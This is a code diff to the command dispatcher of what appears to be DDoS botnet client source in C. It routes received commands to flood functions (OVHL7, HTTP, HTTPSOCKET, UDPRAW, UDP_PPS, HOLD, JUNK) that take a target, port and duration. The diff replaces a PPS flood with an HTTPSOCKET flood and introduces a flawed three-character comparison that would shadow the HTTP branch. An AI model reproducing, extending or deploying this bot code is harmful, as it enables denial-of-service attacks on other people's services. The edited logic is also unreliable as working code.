@@ -25,14 +25,14 @@ void ft_manage_request(char *ptr) {
         if (split_len >= 4) {
             if (!strncmp(split[0], "OVHL7", 5) && split_len == 5)
                 OVHL7(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
-            else if (!strncmp(split[0], "PPS", 3) && split_len == 5)
-                PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
-            else if (!strncmp(split[0], "HTTP", 4) && split_len == 7) // Already forked
+            else if (!strncmp(split[0], "HTTPSOCKET", 3) && split_len == 5)
+                HTTPSOCKET(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
+            else if (!strncmp(split[0], "HTTP", 4) && split_len == 7)
                 HTTP(split[5], split[1], atoi(split[2]), split[4], atoi(split[3]), atoi(split[6]));
             else if (!strncmp(split[0], "UDPRAW", 6))
                 UDPRAW(split[1], atoi(split[2]), atoi(split[3]));
             else if (!strncmp(split[0], "UDPPPS", 6) && split_len == 5)
-                UDP_PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4])); //, atoi(split[5])
+                UDP_PPS(split[1], atoi(split[2]), atoi(split[3]), atoi(split[4]));
             else if (!strncmp(split[0], "HOLD", 4))
                 HOLD(split[1], atoi(split[2]), atoi(split[3]));
             else if (!strncmp(split[0], "JUNK", 4))
